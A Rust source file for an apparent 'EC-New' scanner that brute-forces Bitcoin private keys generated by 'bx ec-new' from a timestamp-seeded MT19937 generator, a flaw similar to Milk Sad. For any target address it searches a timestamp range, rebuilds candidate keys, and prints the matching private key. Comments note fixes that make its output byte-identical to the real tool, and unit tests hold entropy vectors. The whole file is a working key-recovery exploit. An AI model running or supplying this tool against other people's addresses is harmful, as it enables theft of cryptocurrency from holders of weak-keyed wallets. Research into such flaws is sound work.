use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use rand_mt::Mt19937GenRand32;
use tracing::{info, warn};

/// Generic "Ec-New" Scanner
/// Vulnerability: Private key generated directly from PRNG (MT19937) seeded with timestamp
/// Similar to Milk Sad, but without BIP39 mnemonic step.
/// Use: bx ec-new (with weak RNG)
///
/// Bugs fixed:
/// 1. CRITICAL — Custom Mt19937 produced a different sequence than the `rand_mt` crate
///    (and therefore different than the real libbitcoin/bx ec-new).  Now uses
///    `rand_mt::Mt19937GenRand32` directly, consistent with milk_sad.rs.
/// 2. CRITICAL — MSB extraction: bx ec-new calls next_u32() once per OUTPUT BYTE
///    and takes only the most-significant byte (val >> 24).
/// 3. Uncompressed P2PKH: real bx pipelines sometimes produced uncompressed keys.
///    Both compressed and uncompressed addresses are checked.
/// 4. start > end panic: `end - start` on u32 underflowed.  Guard added.
/// 5. Minor: `checked` now increments regardless of SecretKey validity.
pub fn run(target_address: &str, start_ts: Option<u32>, end_ts: Option<u32>) -> Result<()> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");

    let start = start_ts.unwrap_or(1_300_000_000);
    let end   = end_ts.unwrap_or(1_735_689_600); // Jan 1 2025

    // FIX 4: guard against u32 underflow.
    if end < start {
        anyhow::bail!("--end ({}) must be >= --start ({})", end, start);
    }

    info!("Target: {}", target_address);
    info!("Time range: {} to {} ({} seconds)", start, end, end - start);

    let secp    = Secp256k1::new();
    let network = Network::Bitcoin;

    let target_addr_obj = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?;

    let mut found   = false;
    let start_time  = std::time::Instant::now();
    let mut checked = 0u64;

    'outer: for t in start..=end {
        let entropy_32 = generate_entropy_msb(t);

        if let Ok(sk) = SecretKey::from_slice(&entropy_32) {
            let pk = PublicKey::from_secret_key(&secp, &sk);

            // FIX 3: check compressed and uncompressed P2PKH.
            let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);
            let addr_u = Address::p2pkh(
                bitcoin::PublicKey { inner: pk, compressed: false },
                network,
            );

            for addr in [&addr_c, &addr_u] {
                if *addr == target_addr_obj {
                    warn!("\n\u{1f3af} FOUND MATCH!");
                    warn!("Timestamp:   {}", t);
                    warn!("Private Key: {}", hex::encode(entropy_32));
                    warn!("Address:     {}", addr);
                    warn!("Compressed:  {}", addr == &addr_c);
                    found = true;
                    break 'outer;
                }
            }
        }

        // FIX 5: count every timestamp regardless of SecretKey validity.
        checked += 1;
        if checked % 1_000_000 == 0 {
            let elapsed = start_time.elapsed().as_secs_f64();
            info!(
                "Checked {} timestamps ({:.2} M/s)",
                checked,
                checked as f64 / elapsed / 1_000_000.0
            );
        }
    }

    if found {
        info!("Scan complete. VULNERABILITY FOUND.");
    } else {
        info!("Scan complete. No match found in range.");
    }

    Ok(())
}

/// Generate 32 bytes from MT19937 seeded with `timestamp` using MSB-only extraction,
/// matching the libbitcoin `pseudo_random_seed` / `bx ec-new` behaviour:
///
///   for each output byte: rng.next_u32() once, take (val >> 24) & 0xFF
///
/// Uses `rand_mt::Mt19937GenRand32` — the same crate as milk_sad.rs — to guarantee
/// byte-identical output to the real bx tool.
fn generate_entropy_msb(timestamp: u32) -> [u8; 32] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut bytes = [0u8; 32];
    for byte in bytes.iter_mut() {
        let val = rng.next_u32();
        *byte = (val >> 24) as u8;
    }
    bytes
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Cross-validate against the milk_sad GPU test-vector suite.
    /// Both scanners MUST produce byte-identical output for the same timestamp.
    #[test]
    fn test_matches_milk_sad_test_vectors() {
        // Vectors from milk_sad::tests::test_gpu_test_vectors_entropy
        let cases: &[(u32, &str)] = &[
            (1_234_567_890, "9e695582572b97ff9774a5662626e42fe380c48c3b810f33e4437d216e8b2bab"),
            (1_609_459_200, "49a76eebefb9198533904d82d223070282a8577002b3f5313907ea007474db6c"),
            (1_577_836_800, "f4d5c22a415a49a59d8438e5e465cfa83afa4891d1125982a5f90760622ddf7c"),
            (1_293_840_000, "d5a3f4fd55b0da220673a7496fc717e8e8cba8bde4b35da76d53d6b061694663"),
            (1_690_848_000, "3685466a59c974bb71a0f55a7bf6e617c424df5b4ecadb5893215f392de67b90"),
        ];
        for &(ts, expected) in cases {
            let got = generate_entropy_msb(ts);
            assert_eq!(
                hex::encode(got), expected,
                "Entropy mismatch for timestamp {}", ts
            );
        }
    }

    /// FIX 4: start > end must return Err, not panic.
    #[test]
    fn test_start_greater_than_end_returns_err() {
        let result = run("1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf",
            Some(1_700_000_000), Some(1_400_000_000));
        assert!(result.is_err(), "start > end must return Err");
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("end") && msg.contains(">="),
            "Error message should mention 'end' and '>=', got: {}", msg);
    }
}
